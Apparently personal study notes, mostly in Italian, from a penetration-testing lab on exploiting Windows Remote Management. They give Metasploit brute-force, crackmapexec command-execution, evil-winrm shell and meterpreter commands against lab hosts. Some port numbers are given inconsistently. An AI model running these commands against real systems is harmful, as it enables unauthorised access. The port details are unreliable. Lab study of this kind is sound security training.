# Exploiting WinRM (Windows Remote Management Protocol)

Deve essere abilitato WinRM, non è abilitato di default.

<figure><img src="../../../.gitbook/assets/image (782).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1067).png" alt=""><figcaption></figcaption></figure>

## Bruteforce credenziali con modulo MSF&#x20;

```
postgresql service start
msfconsole
workspace -a WinRM
db_nmap -sS -sV -O -p- 10.4.22.219
use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit
```

<figure><img src="../../../.gitbook/assets/image (1068).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1069).png" alt=""><figcaption></figcaption></figure>

Vediamo che abbiamo la porta 5989 aperta che è quella di WinRM seppur il banner non ce lo dica specificatamente.



Note: This will take around 2-3 minutes.

Note: We are setting the PASSWORD because in the recent version of the "winrm\_login" module, the PASSWORD option is required unless using Kerberos authentication. Metasploit will still use the USERPASS\_FILE file.

<figure><img src="../../../.gitbook/assets/image (797).png" alt=""><figcaption></figcaption></figure>

We have found the valid password of the administrator user. Also, we got the command-shell session opened in the background. We'll further explore the other modules.

Possiamo usare la sessione aperta con il comando: **sessions 1**

## Eseguire comandi arbitrari sul target con crackmapexec

```
crackmapexec winrm 10.2.18.45 -u administrator -p tinkerbell -x "whoami"
crackmapexec winrm 10.2.18.45 -u administrator -p tinkerbell -x "systeminfo"
```

<figure><img src="../../../.gitbook/assets/image (789).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (790).png" alt=""><figcaption></figcaption></figure>

## Ottenere una sessione shell sul target con evil-winrm

```
evil-winrm.rb -u administrator -p tinkerbell -i 10.2.18.45
```

<figure><img src="../../../.gitbook/assets/image (791).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (792).png" alt=""><figcaption></figcaption></figure>

## Ottenere una meterpreter session con un modulo MSF

```
service postgresql start && msfconsole
search winrm_script
use exploit/windows/winrm/winrm_script_exec
show options
set RHOSTS 10.2.18.45
set FORCE_VBS true
set USERNAME administrator
set PASSWORD tinkerbell
exploit
```

<figure><img src="../../../.gitbook/assets/image (793).png" alt=""><figcaption></figcaption></figure>

Viene impostato il payload per 32bit di default.

<figure><img src="../../../.gitbook/assets/image (794).png" alt=""><figcaption></figcaption></figure>

La porta configurata è 5895 che va bene in questo caso, quindi cambiamo solo RHOSTS.

<figure><img src="../../../.gitbook/assets/image (795).png" alt=""><figcaption></figcaption></figure>

Portrebbe essere che non funzioni subito e dobbiamo rieseguirlo.

<figure><img src="../../../.gitbook/assets/image (796).png" alt=""><figcaption></figcaption></figure>
